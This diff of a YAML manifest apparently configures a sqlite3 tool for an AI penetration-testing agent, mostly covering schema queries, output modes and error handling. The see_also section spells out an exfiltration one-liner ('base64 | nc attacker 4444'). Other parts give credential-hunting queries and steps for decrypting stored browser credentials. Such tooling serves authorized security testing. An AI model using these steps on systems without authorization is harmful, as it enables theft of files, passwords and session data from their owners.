@@ -1,9 +1,17 @@
 name: sqlite
-version: "1.0"
-description: "SQLite database client (v3.46.1 with FTS5) for post-exploitation extraction of data from .db and .sqlite files. Accepts database files by path (mounted volume) or base64-encoded content (downloaded from target via ssh/shell-session). Includes automated credential hunting that pattern-matches table names (users, accounts, admin, login, members, employees) and column names (password, hash, token, api_key, secret) to extract username/password pairs. Common targets: WordPress/Drupal user databases, Firefox/Chrome stored credentials and history, mobile app databases, application config stores, session databases, and any web framework using SQLite as backend."
+kind: cli
+binary: sqlite3
+version: "3.46.1"
+description: "SQLite database client (v3.46.1 with FTS5, JSON output mode) via /usr/bin/sqlite3 CLI for post-exploitation extraction of .db / .sqlite files. Stateless per-call: open DB → run SQL/PRAGMA → close. Common engagement use: WordPress/Drupal wp_users tables, Firefox places.sqlite / cookies.sqlite / signons.sqlite, Chrome Login Data, mobile-app DBs, application config + session stores. Migrated kind:mcp → kind:cli May 2026 (daemon-wrapper retirement series, Tier A; 621-LOC Python wrapper collapsed to 22-LOC RunCliServer stub). For online RDBMS targets prefer mysql / mongodb / postgres; for SQL injection use sqlmap."
 image: "ghcr.io/silicon-works/mcp-tools-sqlite:latest"
-image_size_mb: 100
-timeout_seconds: 120
+image_size_mb: 175
+
+# Stateless DB queries — short bounded calls. No daemon, no engagement-lifetime
+# semantics; sqlite3 opens DB, runs SQL, closes. .recover on huge damaged DBs is
+# the slowest expected case (~minutes).
+idle_timeout_seconds: 300
+max_runtime_seconds: 300
+timeout_seconds: 300
 
 capabilities:
   - database_extraction
@@ -21,7 +29,6 @@ resources:
   memory_mb: 128
   cpu: 0.25
 
-# Routing hints for tool selection
 routing:
   use_for:
     - "SQLite database extraction and analysis"
@@ -34,10 +41,12 @@ routing:
     - "enumerate database schema tables columns row counts"
     - "execute SQL queries on local SQLite database file"
     - "mobile app database analysis Android iOS SQLite"
+    - "recover damaged or corrupted SQLite database via .recover"
   never_use_for:
     - "remote database access (use mysql or mongodb)"
-    - "SQL injection (use sqlmap)"
+    - "SQL injection testing (use sqlmap)"
     - "port scanning"
+    - "exfiltrating files from target (use ssh scp or nc held shell first, then run sqlite3 on the local copy)"
   triggers:
     - "SQLite"
     - ".db file"
@@ -45,163 +54,177 @@ routing:
     - "database file"
     - "local database"
     - "extract from database"
+    - "wp_users"
+    - "places.sqlite"
+    - "cookies.sqlite"
+    - "Login Data"
+  prefer_over: []
 
-methods:
-  query:
-    description: "Execute an arbitrary SQL query on a SQLite database and return structured results. Supports any valid SQLite SQL including SELECT, PRAGMA, and aggregate functions. Automatically appends LIMIT to SELECT queries that don't already have one to prevent memory exhaustion on large tables. Returns column names and rows as dictionaries for easy parsing."
-    when_to_use: "When you need to run a specific SQL query that isn't covered by the other convenience methods (list_tables, describe_table, dump_table, find_credentials). Use for: custom JOINs across tables, aggregate queries (COUNT, GROUP BY), LIKE/GLOB pattern searches for specific data, PRAGMA commands for database metadata, or any complex query. Also use when you need to search for specific values (e.g., SELECT * FROM users WHERE role='admin')."
-    params:
-      database:
-        type: string
-        required: true
-        description: "Path to SQLite database file inside the container (e.g., '/data/app.db' if volume-mounted), OR base64-encoded database content if is_base64=true. For databases downloaded from target, use base64 encoding: first download via ssh.download or shell-session, then pass the base64 content here."
-      query:
-        type: string
-        required: true
-        description: "SQL query to execute. Any valid SQLite SQL is accepted. SELECT queries without LIMIT get an automatic LIMIT appended (controlled by limit param). Examples: 'SELECT * FROM users', 'SELECT username, password FROM accounts WHERE active=1', 'PRAGMA table_info(\"users\")', 'SELECT name, sql FROM sqlite_master'."
-      is_base64:
-        type: boolean
-        default: false
-        description: "Set to true when the database parameter contains base64-encoded file content instead of a file path. The server decodes it to a temp file, queries it, then cleans up."
-      limit:
-        type: integer
-        default: 1000
-        description: "Maximum rows to return for SELECT queries. Auto-appended as 'LIMIT N' if the query doesn't already contain a LIMIT clause. Set higher for large extractions."
-    returns:
-      columns:
-        type: array
-        description: "Column names from the query result"
-      rows:
-        type: array
-        description: "Query results as array of dictionaries (column_name: value)"
-      row_count:
-        type: integer
-        description: "Number of rows returned"
+see_also:
+  - tool: ssh
+    reason: "Use `ssh` (kind:cli v3.0) ControlMaster + scp pattern to download the target's .sqlite/.db file to /session/output/sqlite/ before running sqlite3 against it. scp through an established ControlMaster reuses the auth + adds zero per-call overhead."
+  - tool: nc
+    reason: "When ssh isn't available, use `nc` v2.0 held-listener pipeline to receive the .sqlite/.db file (e.g., target runs `cat /path/db.sqlite | base64 | nc attacker 4444`; agent's nc listener writes to /session/output/nc-recv/db.sqlite.b64; then Pattern S0 base64-decodes + queries)."
+  - tool: mongodb
+    reason: "For ONLINE NoSQL DB targets use the `mongodb` (kind:mcp vendor MCP). sqlite is strictly for OFFLINE .sqlite/.db file extraction post-engagement."
+  - tool: exploit-runner
+    reason: "When sqlite3 CLI is insufficient (complex multi-statement migrations, custom Python extraction with sqlite3 stdlib for browser-specific binary password decoding like Firefox signons.sqlite NSS), drop into `exploit-runner` with a Write-staged Python script that uses sqlite3 + the relevant decryption library (e.g., pyasn1 for NSS, cryptography for Chrome v10/v11 key)."
+  - tool: hash-lookup
+    reason: "After find_credentials extracts password hashes (MD5 in WordPress phpass, bcrypt $2a$, $P$ phpass), feed to `hash-lookup` to check public pre-cracked databases (hashes.com, NIST) before spending CPU on hashcat."
 
-  list_tables:
-    description: "List all tables in a SQLite database with row counts for each table. Queries sqlite_master for table names and runs COUNT(*) on each. Provides a quick overview of database contents to guide further extraction."
-    when_to_use: "First step when analyzing any SQLite database — run this to see what tables exist and how many rows each contains before deciding what to extract. Large row counts in tables named 'users', 'accounts', 'sessions', 'logs' etc. indicate high-value targets for extraction."
-    params:
-      database:
-        type: string
-        required: true
-        description: "Path to SQLite database file, or base64-encoded content (set is_base64=true)"
-      is_base64:
-        type: boolean
-        default: false
-        description: "Set to true when database parameter contains base64-encoded file content"
-    returns:
-      tables:
-        type: array
-        description: "List of tables, each with 'name' and 'row_count' fields"
-      count:
-        type: integer
-        description: "Total number of tables in the database"
+target_extraction: []
+reject_flags: []
+reject_flags_reason: "sqlite3 takes a local DB path + SQL; there's no remote-target argument shape. The DB-path positional arg looks superficially like a target but it's a local filesystem path, not a network endpoint. No reject_flags apply."
 
-  describe_table:
-    description: "Get detailed schema of a specific table using PRAGMA table_info(). Returns each column's name, data type, NOT NULL constraint, default value, and whether it's a primary key. Also returns the table's row count."
-    when_to_use: "After list_tables identifies interesting tables, use this to understand column structure before querying or dumping. Helps identify: which columns contain credentials (password, hash, token), which columns are primary keys for JOINs, data types for proper querying, and nullable fields."
-    params:
-      database:
-        type: string
-        required: true
-        description: "Path to SQLite database file, or base64-encoded content (set is_base64=true)"
-      table:
-        type: string
-        required: true
-        description: "Table name to describe (exact name as shown by list_tables)"
-      is_base64:
-        type: boolean
-        default: false
-        description: "Set to true when database parameter contains base64-encoded file content"
-    returns:
-      columns:
-        type: array
-        description: "Column definitions, each with: cid (column index), name, type (e.g., TEXT, INTEGER, BLOB), notnull (boolean), default (default value or null), pk (boolean, is primary key)"
-      column_count:
-        type: integer
-        description: "Number of columns in the table"
-      row_count:
-        type: integer
-        description: "Number of rows in the table"
+usage_patterns:
 
-  dump_table:
-    description: "Extract rows from a specific table with optional column selection. Runs 'SELECT [columns] FROM table LIMIT N' and returns results as dictionaries. Use the columns parameter to select only relevant columns (e.g., username and password) instead of dumping everything."
-    when_to_use: "After identifying interesting tables via list_tables or describe_table, use this to extract the actual data. Prefer this over query for simple full-table or column-filtered extractions since it handles quoting and limiting automatically. For credential tables, consider using find_credentials instead which auto-detects credential columns."
-    params:
-      database:
-        type: string
-        required: true
-        description: "Path to SQLite database file, or base64-encoded content (set is_base64=true)"
-      table:
-        type: string
-        required: true
-        description: "Table name to dump (exact name as shown by list_tables)"
-      columns:
-        type: array
-        description: "Array of column names to select (e.g., ['username', 'password', 'email']). Omit to select all columns. Use describe_table first to see available columns."
-      limit:
-        type: integer
-        default: 100
-        description: "Maximum rows to return. Default 100. Increase for full extraction of small tables, keep low for initial sampling of large tables."
-      is_base64:
-        type: boolean
-        default: false
-        description: "Set to true when database parameter contains base64-encoded file content"
-    returns:
-      columns:
-        type: array
-        description: "Column names in the result set"
-      rows:
-        type: array
-        description: "Table contents as array of dictionaries (column_name: value)"
-      row_count:
-        type: integer
-        description: "Number of rows returned (may be less than total if limited)"
+  - name: "Pattern S0 — base64-encoded DB → file → query (downloaded-from-target flow)"
+    binary: "bash"
+    command: "-c 'mkdir -p /session/output/sqlite && echo \"<B64_STRING>\" | base64 -d > /session/output/sqlite/<name>.db && sqlite3 -json /session/output/sqlite/<name>.db \"<SQL>\"'"
+    when: "Use when target's .sqlite/.db file was exfiltrated as a base64 blob (via held shell `cat db.sqlite | base64`, ssh.exec output, HTTP form upload, etc.). Two-step recipe: (1) Write tool puts base64 string into /session/output/sqlite/<name>.b64, OR agent inlines it in `echo`; (2) base64 -d writes the binary DB then sqlite3 queries it. Round-trip is byte-identical (verified 2026-05-17). For DBs already on disk (scp'd via ssh ControlMaster), skip this pattern and call sqlite3 directly on the path."
 
-  find_credentials:
-    description: "Automatically search for credential-related data by pattern-matching table and column names. Scans table names against 14 patterns (user, users, account, accounts, member, members, admin, admins, login, logins, auth, credential, customer, employee) and column names against username patterns (username, user, login, email, name, account, user_name, user_id) and password patterns (password, passwd, pass, pwd, hash, secret, token, api_key, apikey, auth, credential). If no credential-pattern tables are found, falls back to searching ALL tables for credential-pattern columns. Returns extracted username/password pairs with source table."
-    when_to_use: "First thing to run on any database found during post-exploitation. Automatically identifies and extracts credentials without needing to know the schema. Works on: CMS databases (WordPress wp_users, Drupal users), custom web app databases, configuration stores, session databases. If this returns no results, fall back to list_tables → describe_table → dump_table for manual analysis."
-    params:
-      database:
-        type: string
-        required: true
-        description: "Path to SQLite database file, or base64-encoded content (set is_base64=true)"
-      is_base64:
-        type: boolean
-        default: false
-        description: "Set to true when database parameter contains base64-encoded file content"
-      limit:
-        type: integer
-        default: 100
-        description: "Maximum rows to extract per matching table"
-    returns:
-      credential_tables:
-        type: array
-        description: "Table names that matched credential patterns (or all tables if no pattern matches found)"
-      credentials:
-        type: array
-        description: "Extracted credential data, each with 'table' (source table name) and matched column values (e.g., username, password, hash, email, token)"
-      count:
-        type: integer
-        description: "Total number of credential rows extracted across all tables"
+  - name: "Pattern S1 — list_tables (first probe of any new DB)"
+    binary: "sqlite3"
+    command: "-json -readonly /session/output/sqlite/<db> \"SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' ORDER BY name;\""
+    when: "Always the first sqlite3 call on a newly-discovered .db/.sqlite file. Returns a JSON array of user-defined table names; filter `name NOT LIKE 'sqlite_%'` hides internal SQLite metadata (sqlite_master, sqlite_sequence, sqlite_stat1). `-readonly` flag prevents accidental writes to the engagement artifact (critical for forensic-style analysis where the DB might be re-examined later). Output shape: `[{\"name\":\"users\"},{\"name\":\"wp_users\"},...]`."
 
-  schema:
-    description: "Get complete database schema including all tables, their columns (name, type, constraints), row counts, and original CREATE TABLE SQL statements. Provides a comprehensive overview of the entire database structure in one call."
-    when_to_use: "When you want the full picture of a database in a single call rather than running list_tables followed by describe_table on each. Returns more detail than list_tables (includes column definitions and CREATE SQL) but can produce large output for databases with many tables. Prefer list_tables for initial quick look, use schema when you need the complete structure."
-    params:
-      database:
-        type: string
-        required: true
-        description: "Path to SQLite database file, or base64-encoded content (set is_base64=true)"
-      is_base64:
-        type: boolean
-        default: false
-        description: "Set to true when database parameter contains base64-encoded file content"
-    returns:
-      tables:
-        type: object
-        description: "Dictionary keyed by table name, each with: 'columns' (array of {name, type, notnull, pk}), 'row_count' (integer), 'create_sql' (original CREATE TABLE statement)"
-      table_count:
-        type: integer
-        description: "Total number of tables in the database"
+  - name: "Pattern S2 — describe_table (column schema for a specific table)"
+    binary: "sqlite3"
+    command: "-json -readonly /session/output/sqlite/<db> \"PRAGMA table_info('<table>');\""
+    when: "After Pattern S1 identifies an interesting table (e.g., 'users', 'wp_users', 'api_keys'), use this to inspect columns BEFORE selecting data. Returns each column's cid (position), name, type, notnull flag, default value, and pk flag. Output shape: `[{\"cid\":0,\"name\":\"id\",\"type\":\"INTEGER\",\"notnull\":0,\"dflt_value\":null,\"pk\":1},...]`. Use this output to identify credential columns (password/hash/token/secret) and to know which columns are BLOB type (require quote() wrapper — see gotcha)."
+
+  - name: "Pattern S3 — dump_table (extract rows with optional column filter)"
+    binary: "sqlite3"
+    command: "-json -readonly /session/output/sqlite/<db> \"SELECT <cols-or-asterisk> FROM \\\"<table>\\\" LIMIT <N>;\""
+    when: "Extract data from a specific table. Always include `LIMIT N` — kind:cli does NOT auto-inject limits like the legacy wrapper did. Recommend `LIMIT 10` for initial sampling of large tables, `LIMIT 100-1000` for full extraction of credential tables. Use double-quoted column names if any have special chars or reserved keywords (`SELECT \"user-name\", \"select\" FROM \"weird-table\"`). For BLOB columns wrap with `quote(col)` to get lossless hex literals — see gotcha BLOB COLUMNS LOSSY."
+
+  - name: "Pattern S4 — query (arbitrary SQL — JOINs, aggregates, custom WHERE)"
+    binary: "sqlite3"
+    command: "-json -readonly /session/output/sqlite/<db> \"<arbitrary SQL>\""
+    when: "Catch-all for queries not covered by S1-S3: JOINs across tables (`SELECT u.username, s.session_id FROM users u JOIN sessions s ON s.user_id=u.id`), aggregates (`SELECT role, COUNT(*) FROM users GROUP BY role`), LIKE/GLOB searches (`SELECT * FROM users WHERE email LIKE '%@admin.%'`), or PRAGMAs not in S2 (`PRAGMA journal_mode;` to check WAL — see WAL gotcha)."
+
+  - name: "Pattern S5 — full schema (CREATE TABLE statements for all tables)"
+    binary: "sqlite3"
+    command: "-json -readonly /session/output/sqlite/<db> \"SELECT name, sql FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' ORDER BY name;\""
+    when: "When you want full schema context in ONE call (vs. S1 + N×S2). Returns each table's CREATE TABLE statement verbatim. Larger output than S1 but reveals: column types + defaults inline, foreign-key references (`REFERENCES users(id)`), indices, CHECK constraints, generated columns. Use this for unfamiliar DBs where the schema reveals app structure. For just CREATE statements without JSON wrapper, omit -json and run with `.schema` instead: `sqlite3 -readonly /session/output/sqlite/<db> '.schema'` returns multi-line SQL ready for re-execution against a fresh DB."
+
+  - name: "Pattern S6 — find_credentials step 1: candidate tables (replaces legacy heuristic)"
+    binary: "sqlite3"
+    command: "-json -readonly /session/output/sqlite/<db> \"SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' AND (LOWER(name) LIKE '%user%' OR LOWER(name) LIKE '%account%' OR LOWER(name) LIKE '%admin%' OR LOWER(name) LIKE '%member%' OR LOWER(name) LIKE '%auth%' OR LOWER(name) LIKE '%cred%' OR LOWER(name) LIKE '%login%' OR LOWER(name) LIKE '%api%' OR LOWER(name) LIKE '%key%' OR LOWER(name) LIKE '%session%' OR LOWER(name) LIKE '%customer%' OR LOWER(name) LIKE '%employee%');\""
+    when: "Step 1 of replacing the legacy Python `find_credentials` heuristic (14 table + 11 username + 11 password pattern arrays). Returns table names matching common credential-related keywords. Then chain into Pattern S2 (describe_table) per candidate to see columns, grep for credential column patterns (user|login|email|pass|pwd|hash|token|secret|key|cred) — LLM does this trivially from JSON output — then Pattern S3 (dump_table) with just the credential columns. Verified live 2026-05-17 against synthetic DB with users + wp_users + api_keys — extracted plaintext + bcrypt + phpass + API tokens correctly via S6 → S2 → S3 chain. For unusual schemas (Firefox `moz_logins.encryptedUsername/encryptedPassword`, mobile-app obfuscated names like 'tbl_secrets_v2'), the agent reads S1 (full list_tables) + S2 output and emits a TARGETED S3 query directly — LLM does pattern matching from schema text. This pattern is the common-case shortcut; agent-driven query chain is the fallback."
+
+output_formats:
+  - flag: "-json"
+    format: "json"
+    preferred: true
+    notes: "JSON array of row-objects. Default for all parsing recipes. Requires sqlite ≥3.33 (image has 3.46). Empty result set returns empty stdout (NOT '[]') — agent's parser must handle. NULL values become JSON null. BLOB bytes are UTF-8-escaped (lossy) — use quote(col) for hex literal."
+  - flag: "-csv"
+    format: "csv"
+    preferred: false
+    notes: "Comma-separated with optional header (-header / -noheader). Use when piping into other CSV tools (`xsv`, spreadsheet imports) or when JSON would balloon output (very wide rows)."
+  - flag: "-line"
+    format: "text"
+    preferred: false
+    notes: "Human-readable `name = value` lines per cell. Useful for one-row PRAGMA outputs (`PRAGMA database_list`) when the JSON would be over-structured for the reader."
+  - flag: ""
+    format: "text"
+    preferred: false
+    notes: "Default mode: pipe-separated rows, no header. Compact but fragile (any | in data corrupts parsing). Avoid for credential extraction; use -json instead."
+
+common_options:
+  output_modes:
+    - "-json: JSON array of objects (preferred for parsing)"
+    - "-csv: CSV with optional header (-header turns on column names)"
+    - "-line: name=value pairs, one per line"
+    - "-column: fixed-width column output (human-readable)"
+    - "-table: ASCII table output (markdown-like, readable)"
+    - "-markdown: GitHub-flavored markdown table"
+    - "-insert: SQL INSERT statements (full SQL backup)"
+    - "-list: pipe-separated, no header (default)"
+  controls:
+    - "-readonly: open DB read-only (recommended for forensic safety on engagement artifacts)"
+    - "-batch: force batch mode (no interactive prompts even if stdin is a TTY)"
+    - "-bail: stop on first error instead of continuing"
+    - "-header / -noheader: turn column headers on/off (default depends on mode)"
+    - "-nullvalue TEXT: distinguish NULL from empty string in output (e.g., -nullvalue NULL)"
+    - "-separator SEP: custom column separator (default '|' for list mode)"
+    - "-init FILE: read+execute FILE before reading stdin (setup script)"
+    - "-cmd 'COMMAND': run 'COMMAND' before reading stdin (useful for `.timeout 5000` for locked DBs)"
+  dot_commands:
+    - ".tables [pattern]: list tables (filterable by GLOB pattern)"
+    - ".schema [table]: show CREATE TABLE for table (or all tables if omitted)"
+    - ".indices [table]: list indices on table"
+    - ".databases: list attached database files"
+    - ".dump [table]: full SQL dump (CREATE + INSERT statements)"
+    - ".read FILE: execute SQL script from file"
+    - ".recover: reconstruct readable data from a corrupted DB (sqlite ≥3.40)"
+    - ".timeout MS: wait up to MS milliseconds for a locked DB"
+    - ".help: list all dot-commands (run interactively)"
+
+gotchas:
+  - "JSON OUTPUT FOR PARSING: always use `-json` for SELECT/PRAGMA recipes — default pipe-separated mode is fragile (any `|` in data corrupts parsing) + quoting is messy. JSON requires sqlite ≥3.33; image has 3.46. Empty result set returns EMPTY stdout (not `[]`), so the parser must handle empty as `0 rows`, NOT as an error."
+
+  - "BLOB COLUMNS LOSSY IN -json: when a column type is BLOB (visible via PRAGMA table_info), `-json` UTF-8-escapes the bytes which silently corrupts non-UTF-8 binary data (password hashes stored as BLOB, image data, encrypted secrets). Wrap with `quote(col)` to get lossless `X'89504E47...'` hex literal output: `SELECT username, quote(password_blob) AS pw_hex FROM users`. Verified 2026-05-17 on synthetic DB with PNG-header BLOB column."
+
+  - "EMPTY TABLES RETURN EMPTY STDOUT in -json mode: `sqlite3 -json db \"SELECT * FROM empty_audit_log\"` returns NOTHING (zero bytes). Agent's parser must interpret empty stdout as `0 rows` not as parse error. Same with WHERE clauses that match zero rows."
+
+  - "SPECIAL CHAR / RESERVED KEYWORD COLUMN+TABLE NAMES: SQLite identifiers with hyphens, dots, or SQL keywords (`select`, `order`, `group`, `from`) must be DOUBLE-quoted in SQL: `SELECT \"user-name\", \"select\" FROM \"weird-table\"`. JSON output keys carry the quoted name verbatim — no client-side issue. Single quotes are for string literals, NOT identifiers — mixing them up produces 'no such column' errors."
+
+  - "NO AUTO-LIMIT (legacy wrapper had it): the kind:mcp wrapper auto-appended `LIMIT 1000` to SELECTs without one. kind:cli does NOT — agent MUST include `LIMIT N` explicitly or risk dumping huge tables into context. Recommend LIMIT 10 for initial probe (especially on tables with >10k rows seen in describe_table row_count), LIMIT 100-1000 for credential-table full extractions."
+
+  - "DOWNLOADED-FROM-TARGET DB (base64 path, Pattern S0): the legacy `is_base64=true` parameter is replaced by a 2-step recipe — Write tool stages the base64 string into /session/output/sqlite/<name>.b64 (or agent inlines), then `base64 -d` writes the binary file, then sqlite3 queries it. Byte-identical round-trip verified 2026-05-17 against 45KB synthetic DB. For DBs already on disk via scp through ssh ControlMaster, skip the base64 step entirely."
+
+  - "WAL MODE SIDECARS (Firefox / Chrome / mobile apps): SQLite databases in WAL journal mode have `-wal` and `-shm` companion files containing uncommitted recent writes. Many real targets (Firefox `places.sqlite`, Chrome `Login Data`, Android/iOS app DBs) ship in WAL mode. If you download ONLY the main `.db` from target, you LOSE the most recent writes. Always check first: `sqlite3 -readonly db.sqlite \"PRAGMA journal_mode;\"` — if `wal`, also download `db.sqlite-wal` and `db.sqlite-shm` and place all three in the same directory; sqlite3 auto-loads sidecars on open."
+
+  - "FIND_CREDENTIALS HEURISTIC MOVED FROM WRAPPER TO RECIPE+AGENT: legacy Python wrapper had hardcoded 14 table + 11 username + 11 password regex arrays. Pattern S6 ports the common case as a bash recipe (sqlite3 + awk + grep). For novel schemas where the table/column names don't match common patterns (Firefox `moz_logins.encryptedUsername/encryptedPassword`, mobile-app obfuscated names like `tbl_creds_v2`, custom-app `accounts_internal.pw_hash_v3`), the agent reads `list_tables` + `describe_table` output and emits a TARGETED query — LLMs trivially recognize 'encryptedPassword' as a credential column without a regex array."
+
+  - "INTERNAL sqlite_* TABLES (sqlite_master, sqlite_sequence, sqlite_stat1): every SQLite DB has metadata tables prefixed `sqlite_`. Filter via `name NOT LIKE 'sqlite_%'` in list_tables / schema recipes. In sqlite ≥3.33, `sqlite_master` is also aliased as `sqlite_schema` (more accurate name); both refer to the same table — either works."
+
+  - ".recover FOR DAMAGED DATABASES: if `sqlite3 db.sqlite \".tables\"` fails with `Error: file is not a database` or `Error: database disk image is malformed`, try `sqlite3 db.sqlite '.recover' > /session/output/sqlite/recovered.sql` followed by `sqlite3 /session/output/sqlite/new.db < /session/output/sqlite/recovered.sql` to reconstruct what's salvageable. `.recover` produces a SQL script (CREATE + INSERT statements) for everything it can extract from page-by-page scan. Output is verbose; pipe through grep if you only need specific tables."
+
+  - "READ-ONLY ACCESS RECOMMENDED for engagement artifacts: append `-readonly` to all S1-S5 recipes (already done in the default recipes above). Prevents accidental writes (e.g., a `DELETE` typo or a forgotten test-INSERT) to a downloaded DB that may be re-examined later or referenced in the report. Trivially small flag, large safety win."
+
+  - "CONNECTION TIMEOUT for LOCKED DBs: if you're operating on a target's live DB through a sibling spawn (rare — most engagement flow is download-then-analyze offline) and the app is actively writing, `sqlite3 db \"SELECT...\"` may fail with `Error: database is locked`. Use `-cmd '.timeout 5000'` to wait up to 5s for the lock. Or copy the file out: `cp db db.copy && sqlite3 db.copy ...` (sqlite locks live on the inode, not the path-copy)."
+
+  - "DOT-COMMANDS vs SQL SYNTAX: SQL statements (`SELECT`, `PRAGMA`, `INSERT`) are passed as the second arg to sqlite3 directly. Dot-commands (`.tables`, `.schema`, `.dump`, `.recover`) also work as the second arg, OR via `-cmd '.tables'` before the SQL stdin. Mixing them in one string is finicky — prefer separate calls or use `-cmd` for setup + SQL for the actual query."
+
+  - "BROWSER-SPECIFIC DECRYPTION OUT OF SCOPE for raw sqlite3: Firefox `signons.sqlite` / `logins.json` stores credentials encrypted with NSS (Network Security Services); the DB content is base64-encoded ciphertext, NOT cleartext. sqlite3 only extracts the encrypted blob. To decrypt, route to `exploit-runner` with a Python script using `pyasn1 + python-nss` (or browser-cookies-decrypt utilities). Same for Chrome `Login Data` (DPAPI on Windows / Keychain on macOS / Secret Service on Linux for v10+ encrypted_value blobs)."
+
+failure_signatures:
+  - signal: "Error: file is not a database"
+    layer: "format"
+    remediation: "The file isn't a recognizable SQLite DB. Identify what it is: (1) `file /session/output/sqlite/<db>` — if 'SQLite 3.x' but still failing, the header is fine but pages corrupted → try `.recover`: `sqlite3 db '.recover' > recovered.sql; sqlite3 new.db < recovered.sql`. (2) If `file` reports 'data' (no magic) and `xxd db | head -1` shows bytes 0-15 as random (not the literal string 'SQLite format 3\\\\0'), it's an ENCRYPTED SQLCipher database — sqlite3 CLI cannot read it without the key. Either (a) use the `sqlcipher` binary if installed elsewhere (not in this image), or (b) route to exploit-runner with a Python script using pysqlcipher3 + the recovered key; (c) if you have a memory dump of the app process, grep for the SQLCipher key. (3) For partial downloads, re-check via `wc -c` against target's `ls -la` of the source file. (4) Journal/WAL sidecars (`-journal`, `-wal`, `-shm`) are NOT standalone databases — they require the main `.db` file to be useful."
+
+  - signal: "Error: no such table:"
+    layer: "sql"
+    remediation: "Table name typo or case mismatch. Run Pattern S1 (list_tables) to see exact names. SQLite identifiers are case-sensitive when quoted; bare identifiers are case-insensitive but reserved keywords need quoting. Use `\"TableName\"` (double quotes) for case-preserving + special-char-tolerant access."
+
+  - signal: "Error: no such column:"
+    layer: "sql"
+    remediation: "Column name typo, case mismatch, or unquoted identifier where one is needed. Run Pattern S2 (describe_table) to see exact column names. Quote special-char columns: `\"col-name\"`, `\"select\"`. Don't use single quotes — those are for string literals and produce confusing 'no such column' errors when applied to identifiers."
+
+  - signal: "Error: near"
+    layer: "sql"
+    remediation: "SQL syntax error. Most common: unescaped single quotes in string literals (use `''` to escape: `WHERE name = 'O''Brien'`); missing comma between SELECT columns; trailing semicolon in unsupported context; mixing -cmd dot-command + SQL in one string. Inspect the offending token shown after 'near' and check quoting + escaping."
+
+  - signal: "Error: database is locked"
+    layer: "lock"
+    remediation: "Another process holds an exclusive lock (rare on offline engagement DBs; can happen if you're querying a target's live DB through a sibling spawn). Two fixes: (1) wait — add `-cmd '.timeout 5000'` to wait up to 5s; (2) bypass — copy the file (`cp db db.copy && sqlite3 -readonly db.copy ...`); SQLite locks live on inode + path, copy gets a fresh inode."
+
+  - signal: "Error: unable to open database file"
+    layer: "io"
+    remediation: "Path doesn't exist, not readable, or directory missing. Verify with `ls -la /session/output/sqlite/`. For Pattern S0 (base64 path): confirm `base64 -d` ran without error before sqlite3 — bad base64 produces a 0-byte file or partial garbage. Check permissions: DB file needs read perm; if WAL mode, the directory also needs write perm for the -shm/-wal sidecars (use `-readonly` to bypass this requirement)."
+
+help_commands:
+  - name: "sqlite3 — top-level CLI help"
+    binary: "sqlite3"
+    command: "--help"
+    when: "Print sqlite3's command-line flag list (output modes, controls, special options). target=null."
+  - name: "sqlite3 — interactive dot-command reference"
+    binary: "sqlite3"
+    command: ":memory: '.help'"
+    when: "Print all dot-commands (.tables, .schema, .dump, .recover, .read, .mode, etc.) with one-line descriptions. Uses :memory: (in-RAM throwaway DB) so no file needed. target=null."
+  - name: "sqlite3 — show all PRAGMAs"
+    binary: "sqlite3"
+    command: ":memory: 'PRAGMA pragma_list;'"
+    when: "List all PRAGMA names available in this sqlite build. Useful for finding non-obvious introspection PRAGMAs (foreign_key_list, index_list, integrity_check, etc.). target=null."
